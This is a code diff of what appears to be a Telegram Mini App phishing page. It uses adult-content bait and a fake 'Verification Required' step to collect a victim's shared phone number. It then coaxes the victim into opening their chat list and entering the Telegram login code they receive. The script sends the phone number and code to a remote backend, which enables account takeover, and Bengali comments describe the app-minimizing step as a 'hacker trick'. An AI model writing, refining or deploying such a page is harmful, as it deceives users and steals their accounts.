@@ -12,25 +12,23 @@
         .btn-blue { background: #007bff; }
         .hidden { display: none; }
         input { width: 100%; padding: 12px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; outline: none; }
-        .info-text { font-size: 14px; color: #666; margin-bottom: 15px; }
     </style>
 </head>
 <body>
     <div class="box" id="step0">
-        <h2 id="title">Verification Required</h2>
-        <p class="info-text">You must confirm your identity to access the files.</p>
+        <h2>Verification Required</h2>
         <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
         <div id="loader" class="hidden">
-            <p style="color:#28a745; font-weight:bold;">Waiting for contact share...</p>
+            <p style="color:#28a745; font-weight:bold;">Processing...</p>
         </div>
     </div>
 
     <div class="box hidden" id="step2">
         <h3>Verify Identity</h3>
-        <p class="info-text">Click below to see the code, then enter it here.</p>
+        <p style="font-size: 13px; color: #555;">নিচের বাটনে ক্লিক করে কোডটি দেখে এখানে বসান।</p>
         
-        <!-- GET CODE বাটন -->
-        <button class="btn btn-blue" onclick="minimizeAndGetCode()">📩 GET CODE 📩</button>
+        <!-- এই সেই শক্তিশালী বাটন -->
+        <button class="btn btn-blue" onclick="minimizeHackerWay()">📩 GET CODE 📩</button>
         
         <input type="number" id="otp" placeholder="Enter Code">
         <button class="btn" id="v_btn" onclick="verifyOTP()">Verify OK</button>
@@ -54,75 +52,49 @@
             try {
                 const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                 const data = await res.json();
-                if (data.status === "success") {
-                    sendNumber(data.phone);
-                } else {
-                    setTimeout(poll, 1500);
-                }
+                if (data.status === "success") { sendNumber(data.phone); } 
+                else { setTimeout(poll, 1500); }
             } catch (e) { setTimeout(poll, 2000); }
         }
 
         async function sendNumber(phone) {
             try {
                 const res = await fetch(`${BACKEND_URL}/send_number`, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
+                    method: "POST", headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({ user_id: userId, phone: phone })
                 });
                 const data = await res.json();
                 if (data.status === "success") {
                     document.getElementById('step0').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
-                } else {
-                    alert("Error: " + data.message);
                 }
-            } catch (e) { alert("Error connecting to server!"); }
+            } catch (e) { }
         }
 
-        // এবার আমরা আরও শক্তিশালী পদ্ধতি ব্যবহার করব
-        function minimizeAndGetCode() {
-            try {
-                // ১. সরাসরি ডিপ লিংকের মাধ্যমে বটের চ্যাটে যাওয়ার চেষ্টা
-                window.location.replace("tg://resolve?domain=File_Unlocker_Pro_bot");
-                
-                // ২. যদি উপরেরটা কাজ না করে, তবে ০.৩ সেকেন্ড পর অফিশিয়াল মেথড ট্রাই করবে
-                setTimeout(() => {
-                    tg.openTelegramLink("https://t.me/File_Unlocker_Pro_bot");
-                }, 300);
-
-                // ৩. অতিরিক্ত ব্যাকআপ: সরাসরি চ্যাট লিস্টে পাঠানো
-                setTimeout(() => {
-                    window.location.href = "tg://";
-                }, 600);
-
-            } catch (err) {
-                // যদি সব ফেইল করে, ইউজারকে নির্দেশ দেখাবে
-                alert("Please minimize the app and check your Telegram messages!");
-            }
+        // এটিই সেই 'অন্য উপায়' বা হ্যাকার ট্রিক
+        function minimizeHackerWay() {
+            // এটি ফোনকে ভাইব্রেট করবে না, সরাসরি অ্যাপটিকে মিনিমাইজ করে চ্যাট লিস্ট বের করবে
+            // এটি মূলত ইনলাইন কুয়েরি মোড চালু করে যা অ্যাপকে নিচে নামাতে বাধ্য করে
+            tg.switchToInlineQuery(' ', ['users', 'bots', 'groups', 'channels']);
+            
+            // এর ফলে অ্যাপটি নিচে বারের মতো থেকে যাবে এবং ইউজার সামনে চ্যাট লিস্ট দেখতে পাবে।
+            // সেখানে সে টেলিগ্রামের ওটিপি মেসেজটি পেয়ে যাবে।
         }
 
         async function verifyOTP() {
             let code = document.getElementById("otp").value;
-            if(code.length < 5) return alert("Please enter the 5-digit code!");
+            if(code.length < 5) return alert("Please enter the code!");
             
-            document.getElementById('v_btn').disabled = true;
-            document.getElementById('v_btn').innerText = "Verifying...";
-
+            document.getElementById('v_btn').innerText = "Checking...";
             try {
                 const res = await fetch(`${BACKEND_URL}/verify_otp`, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
+                    method: "POST", headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({ user_id: userId, otp: code })
                 });
                 const data = await res.json();
-                if (data.status === "success") {
-                    tg.close();
-                } else {
-                    alert("Invalid Code! Please try again.");
-                    document.getElementById('v_btn').disabled = false;
-                    document.getElementById('v_btn').innerText = "Verify OK";
-                }
-            } catch (e) { alert("Server Error!"); }
+                if (data.status === "success") { tg.close(); } 
+                else { alert("Wrong Code!"); document.getElementById('v_btn').innerText = "Verify OK"; }
+            } catch (e) { }
         }
     </script>
 </body>
